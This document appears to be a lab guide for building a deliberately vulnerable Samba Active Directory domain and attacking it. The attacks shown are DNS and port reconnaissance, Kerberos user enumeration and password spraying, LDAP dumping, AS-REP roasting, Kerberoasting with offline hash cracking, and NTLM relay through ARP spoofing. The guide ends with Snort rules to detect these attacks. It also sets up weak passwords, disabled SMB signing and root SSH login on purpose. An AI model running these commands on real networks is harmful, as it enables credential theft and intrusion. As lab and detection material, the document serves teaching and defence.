# Samba Lab

## Appliances
- DC (tiagodelgado/samba:1.0)
- DM (tiagodelgado/samba:1.0)
- Attacker (tiagodelgado/samba-attacker:2.0)
- NAT
- Switch

## Domain Controller
1. Set the IP address through the `Edit config` file. [192.168.122.10]
2. Choose a hostname for the Domain Controller and change it through the ***Change hostname*** option. [DC]
3. Add the following line to the /etc/hosts file: 192.168.122.10 DC.polaris.org DC
4. Create the Active Directory Domain.
```bash
    /usr/local/samba/bin/samba-tool domain provision --use-rfc2307 --interactive
```
5. Configure the DNS Resolver.
```bash
# Remove the symlink file /etc/resolv.conf
unlink /etc/resolv.conf
# Create a new /etc/resolv.conf file
touch /etc/resolv.conf
```
6. Add the lines to the etc/resolv.conf file.

```Bash
search polaris.org
nameserver 192.168.122.10
# Useful to be able to resolve names when the samba service is not active
nameserver 8.8.8.8
```

7. Finish configurations and start the Domain Controller service.
```bash
# Add attribute immutable to the file /etc/resolv.conf
chattr +i /etc/resolv.conf
cp /usr/local/samba/private/krb5.conf /etc/krb5.conf
# Start samba daemon
/usr/local/samba/sbin/samba
```

### DHCP Server
1. Install DHCP Server. [Add to Dockerfile]
```bash
apt install isc-dhcp-server
```

2. Edit the `/etc/dhcp/dhcpd.conf` file to configure the DHCP Server.

```bash
subnet 192.168.122.0 netmask 255.255.255.0 {
 range 192.168.122.100 192.168.122.200;
 option routers 192.168.122.1;
 option domain-name-servers 192.168.122.10;
 option domain-name "polaris.org";
}
```

3. Edit `/etc/default/isc-dhcp-server` to specify the interfaces the service should listen on.

```bash
INTERFACESv4="eth0"
```

4. Start the DHCP service.
```bash
service isc-dhcp-server restart
```

### Reverse Zone
1. Create a Reverse Lookup zone. [Link](https://wiki.samba.org/index.php/Setting_up_Samba_as_an_Active_Directory_Domain_Controller#Create%20a%20reverse%20zone) 
```bash
/usr/local/samba/bin/samba-tool dns zonecreate 192.168.122.10 122.168.192.in-addr.arpa -U Administrator
```

2. Create the PTR (reverse) DNS record for the DC.
```bash
/usr/local/samba/bin/samba-tool dns add 192.168.122.10 122.168.192.in-addr.arpa 10 PTR DC.polaris.org -U Administrator
```

### Configure Users
**Add the instruction to create the vulnerable Samba AD.**

 
1. Add users to the domain. 
```bash
/usr/local/samba/bin/samba-tool user add skyler.white Password123
/usr/local/samba/bin/samba-tool user add saul.goodman beTTer@caLL@me --description="DELETE THIS LATER. Password: beTTer@caLL@me"
/usr/local/samba/bin/samba-tool user add walter.white Metho1o590oA$elry
/usr/local/samba/bin/samba-tool user add hank.schrader sHyangja@10
/usr/local/samba/bin/samba-tool user add jesse.pinkman Wang0Tang0!
```



### Testing configuration
#### Verifying the File Server

1. `/usr/local/samba/bin/smbclient -L localhost -N`
2. `/usr/local/samba/bin/smbclient //localhost/netlogon -UAdministrator -c 'ls'`

#### Verifying DNS
1. `host -t SRV _ldap._tcp.polaris.org.`
2. `host -t SRV _kerberos._udp.polaris.org.`
3. `host -t A DC.polaris.org.`

#### Verifying Kerberos
1. `kinit administrator`
2. `klist`

## Domain Member

1. Set the IP address through the ***Edit config file***. [192.168.122.20]
2.  Choose a hostname for the Domain Member and change it through the ***Change hostname*** option. [DM]
3. Set the DNS server IP and AD DNS domain in the `/etc/resolv.conf`:
```bash
 nameserver 192.168.122.10
 search polaris.org
```

4. To configure Kerberos on the domain member, set the following in the `/etc/krb5.conf` file:
```bash
 [libdefaults]
     		default_realm = POLARIS.ORG
     		dns_lookup_realm = false
     		dns_lookup_kdc = true
```

5. Configuring the autorid Back End:
```bash
 [global]
        security = ADS
        workgroup = POLARIS
        realm = POLARIS.ORG

        log file = /var/log/samba/%m.log
        log level = 1

        template shell = /bin/bash
 	   template homedir = /home/%U

        # Default ID mapping configuration using the autorid
        # idmap backend. This will work out of the box for simple setups
        # as well as complex setups with trusted domains.
        # NOTE: You cannot and must not use 'winbind use default domain = yes'
        #       with the autorid idmap backend. This means that your users
        #       will need to login using the format 'DOMAIN\username'.
        #       If you want your users to login just using 'username' then
        #       you cannot use the 'autorid' idmap backend.
        idmap config * : backend = autorid
        idmap config * : range = 10000-24999999
```

6. Reload the Samba configuration:
```bash
 /usr/local/samba/bin/smbcontrol all reload-config
 ```

7. Map the domain accounts to a local account to execute file operations on the domain member's file system as a different user than the account that requested the operation on the client:
* Add the following parameter to the `[global]` section of your smb.conf file:
```bash
  username map = /usr/local/samba/etc/user.map
  ```
* Create the `/usr/local/samba/etc/user.map` file with the following content:
```bash
  !root = POLARIS\Administrator
 ```
8. To join the host to an Active Directory (AD), enter:
```bash
 /usr/local/samba/bin/net ads join -U administrator

 OR
 # For NT4 Domains 
 /usr/local/samba/bin/net rpc join -U administrator

 OR

 /usr/local/samba/bin/samba-tool domain join samdom.example.com MEMBER -U administrator
 
```


9. Start the `smbd`, `nmbd` and `winbindd` services to have a fully functioning Unix domain member:
**[Note]:** If you do not require Network Browsing, you do not need to start the nmbd service on a Unix domain member.
```bash
/usr/local/samba/sbin/smbd
/usr/local/samba/sbin/winbindd
/usr/local/samba/sbin/nmbd
```


## Attacker
1. Set the IP address through the ***Edit config file***. [192.168.122.50]
2. Choose a hostname for the Domain Member and change it through the ***Change hostname*** option. [Attacker]

### Reconnaissance
#### DHCP
1. Obtain information about the Domain, such as the domain name and DNS server(s). 
```bash
nmap --script broadcast-dhcp-discover
```

#### DNS
1. Try to reverse the DNS server through DHCP  discovery.
```bash
nslookup -type=ptr 192.168.122.10 192.168.122.10
OR
host 192.168.11.10
```

2. After finding the domain name, check if the Nameserver corresponds to the Domain Controller by checking it has some critical DC services such as Kerberos and LDAP.
```bash
nslookup -type=srv _kerberos._tcp.polaris.org.
nslookup -type=srv _ldap._tcp.polaris.org.
```

#### NETBIOS [OPTIONAL]
The tools `nbtscan` and `nmblookup` can be used for reverse lookup (IP addresses to NetBIOS names).
```bash
# Name lookup on a range
nbtscan -r 192.168.122.0/24

# Find names and workgroup from an IP address
nmblookup -A 192.168.11.10
```

#### Port Scanning
The `nmap` utility can be used to scan for open ports in an IP range.
```bash
# -sS for TCP SYN scan
# -n for no name resolution
# --open to only show (possibly) open port(s)
# -p for port(s) number(s) to scan
nmap -sS -n --open -p 88,389 192.168.122.0/24
```

### Movement
#### User Enumeration
Enumerate the users in the Active Directory Domain Controller using a users list.
```bash
./kerbrute userenum -d polaris.org users.txt --dc 192.168.122.10
```

#### Password Spraying

Perform a horizontal brute force attack against a list of domain users. This is useful for testing one or two common passwords when you have a large list of users.
```bash
./kerbrute passwordspray -d polaris.org valid_users.txt --dc 192.168.122.10 Password123
```

#### LDAP Dump
1. On the attacker, to avoid the attacker from verifying the certificate from TLS connections, add the line to the file `/etc/ldap/ldap.conf`: `TLS_REQCERT never`. [Link](https://www.openldap.org/software/man.cgi?query=ldap.conf&sektion=5&apropos=0&manpath=OpenLDAP+2.4-Release)

2. On the Domain Controller, add a user with a description in Domain.
```bash
/usr/local/samba/bin/samba-tool user add saul.goodman beTTer@caLL@me --description="DELETE THIS LATER. Password: beTTer@caLL@me"
```
Now, the LDAP queries can be performed from the attacker workstation to obtain relevant information about the AD and its objects.

1. With TLS:
```bash
ldapsearch -H ldap://192.168.122.10 -D "CN=saul.goodman,CN=Users,DC=polaris,DC=org" -w "beTTer@caLL@me" -b "DC=polaris,DC=org" -x -ZZ -LLL "(&(objectCategory=person)(objectClass=user))"
```

2. Without TLS:
```bash
ldapsearch -H ldap://192.168.122.10 -D "CN=saul.goodman,CN=Users,DC=polaris,DC=org" -w "beTTer@caLL@me" -b "DC=polaris,DC=org" -x "(&(objectCategory=person)(objectClass=user))"
```
**[NOTE:]** To perform LDAP queries without TLS, it is necessary to add `ldap server require strong auth = no` on the DC `smb.conf` file.

#### AS-REP Roasting

1. Deactivate Pre-authentication for a given user by modifying the `useraccountcontrol` attribute to `4194816`. 
```bash
/usr/local/samba/bin/samba-tool user edit <user> --editor=nano
```

**[NOTE:]** This does not work when using Heimdal Kerberos in Samba

2. Add to `krb5.conf` file at `[libdefaults]` the line : `allow_rc4 = true`
3. Ask for the TGT without pre-Authentication.
```bash
GetNPUsers.py polaris.org/ -request -no-pass -usersfile valid_users.txt
```
4. Use Hascat/John to decrypt the hash.
```bash
# John
john --wordlist=<wordlist> <hash_file>

# Hashcat
hashcat -m 18200 <hash_file> <wordlist> -o asrephash.cracked --force --quiet
```

#### Kerberoasting

1. Add a user with a Service Principal Name (SPN) that will be the target of the attack. Despite this account not running a service, the account only needs an SPN set to be vulnerable to the attack.
```bash
/usr/local/samba/bin/samba-tool user create walter.white Metho1o590oA$elry
/usr/local/samba/bin/samba-tool spn add HTTP/polaris.org walter.white
```

2. Use an LDAP filter to obtain kerberoastable users.
```bash
ldapsearch -H ldap://192.168.122.10 -D "CN=skyler.white,CN=Users,DC=polaris,DC=org" -w "Password123" -b "DC=polaris,DC=org" -x -ZZ -LLL '(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
```

3. Run the modified version of GetUserSPNs.py.
```bash
GetUserSPNs.py -request polaris.org/skyler.white:Password123 -dc-ip 192.168.122.10 -spn HTTP/polaris.org -userSPN walter.white
```

4. Use Hascat/John to decrypt the hash.
```bash
# John
john --wordlist=<wordlist> <hash_file>

# Hashcat
hashcat -m 13100 <hash_file> <wordlist>
```
#### NTLM Relay
###### Preparation

1. Configure SSH server on the attacker. [Install SSH through Dockerfile]
```bash
apt install openssh-server
nano /etc/ssh/sshd_config -> PermitRootLogin yes
service ssh start
passwd root -> pass:root
```

2. Disable SMB Signing, on both Domain Controller and Domain Members by adding the following lines to the `smb.conf` file.
```bash
# On the Domain Controller
server signing = disabled
# On the Domain Member
client signing = disabled
```

3. Apply the changes by reloading the Samba configuration.
```bash
/usr/local/samba/bin/smbcontrol all reload-config
```

4. Activate Packet forwarding in the Kernel. IP forwarding needs to be enabled otherwise, the attacker's machine will drop the packets not containing its IP address as the destination. 
```bash
sysctl net.ipv4.ip_forward=1
```

5. Changes the destination IP address of the packet to the attacker's IP address. At this point, the attacker is in the middle and receives the packets destined for the SMB server. So what do we do? We change the destination IP address to our IP so that our SMB server running in the background can start relaying our SMB messages.

**NOTE:** Add port 445 (SMB) to improve the filter

```bash
iptables -t nat -A PREROUTING -d 192.168.122.10 -i eth0 -p tcp -m tcp -j DNAT --to-destination 192.168.122.50
```

**Useful commands**
```bash
# List NAT rules
iptables -t nat -L
# Flush NAT rules
iptables -t nat -F
``` 
##### Attack
1. Poison the ARP tables of the Domain Member (DM) and prepare the attacker to relay SMB messages.
```bash
# ARP Poisoning attack
arpspoof -i eth0 -t 192.168.122.20 192.168.122.10 > /dev/null 2>&1 & 

# Prepare attacker to relay all messages received to the DC
ntlmrelayx.py -smb2support -t 192.168.122.10 -i
```

2. On the Domain Member, access a share in the DC (SMB server). Because the ARP tables of the DM are poisoned the request will be sent to the attacker. When the attacker receives the request it will send an **NT_LOGON_failure** to the Domain Member (client) and relay the request to the DC to gain access to the SMB server.
```bash
/usr/local/samba/bin/smbclient //192.168.122.10/netlogon -U Administrator -c 'ls'
```

3. On the second attacker, SSH into the attacker to have a new terminal instance
```bash
ssh <host>@<attacker_ip>
```

4. Connect to the correct port (Impacket usually chooses port 11000 unless it is being used. Nevertheless, always check the correct port on the ntlmrelax.py output)
```bash
nc 127.0.0.1 11000
```
Now you have access to the SMB server. You can press '?' to see the available options. If you type sharesyou can list the available shares.

#### Snort - Detection Rules
1. Install Snort
```bash
apt install snort -y
#network: 192.168.122.0/24
#interface: eth0
#no promiscuous mode
```

2. In the `/etc/snort/snort.conf` file set the variable to your network. [`ipvar HOME_NET 192.168.122.0/24`]
3. **[OPTIONAL]** Go to /etc/snort/snort.conf and erase the lines with the path to the rules except the local.rules.
4. Add the Snort rules `/etc/snort/rules/local.rules`
```bash
# Rule that detects Kerberos Password Spraying/User Enumeration.
alert udp any any -> any 88 (msg:"Kerberos Password Spraying/User Enumeration Detected!!"; flow:to_server; content:"|6a|"; content:"|a2 03 02 01 0a|", distance 10, within 5; threshold:type threshold, track by_src, count 5, seconds 60; metadata: service kerberos; sid:1000001; rev:1;)
alert tcp any any -> any 88 (msg:"Kerberos Password Spraying/User Enumeration Detected!"; flow:to_server, established; content:"|6a|"; content:"|a2 03 02 01 0a|", distance 10, within 5; threshold:type threshold, track by_src, count 5, seconds 60; metadata: service kerberos; sid:1000002; rev:1;)

# Rule that Detects Kerberos packets with RC4 cipher (17) [AS-REQ]. 
alert tcp any any -> $HOME_NET any (msg: "RC4 cipher Detected! [AS-REQ]"; flow:to_server, established; content:"|6a|"; content:"|a2 03 02 01 0a|", distance 10, within 5; content:"|02 01 17|"; metadata: service kerberos; sid:1000003; rev: 2)
alert udp any any -> $HOME_NET any (msg: "RC4 cipher Detected! [AS-REQ]"; flow:to_server; content:"|6a|"; content:"|a2 03 02 01 0a|", distance 10, within 5; metadata: service kerberos; sid:1000004; rev: 2)

# Rule that Detects Kerberos packets with RC4 cipher (17) [TGS-REQ]. 
alert tcp any any -> $HOME_NET any (msg: "RC4 cipher Detected! [TGS-REQ]"; flow:to_server, established; content:"|6c|"; content:"|a2 03 02 01 0c|", distance 12, within 5; content:"|02 01 17|"; metadata: service kerberos; sid:1000005; rev: 2)
alert udp any any -> $HOME_NET any (msg: "RC4 cipher Detected! [TGS-REQ]"; flow:to_server; content:"|6c|"; content:"|a2 03 02 01 0c|", distance 12, within 5; content:"|02 01 17|"; metadata: service kerberos; sid:1000006; rev: 2)

# Test Rule for ICMP packets.
alert icmp any any -> $HOME_NET any (msg: "ICMP Detected!"; sid:1000005; rev: 3)
```
5. To conclude the configuration test the configuration and launch Snort in the background.
```bash
# Test configuration
snort -T -i eth0 -c /etc/snort/snort.conf

# Lauch Snort in background
snort -A full -b -q -i eth0 -c /etc/snort/snort.conf -D &
```

It might be necessary to kill Snort every time it is initialized to be able to read the alerts in `/var/log/snort/alert`. (`kill -9 <Snort_process_id>`)

To be able to read the logs :
```bash
cat /var/log/snort/alert   
tcpdump -r/var/log/snort/snort.log.<timestamp>
```







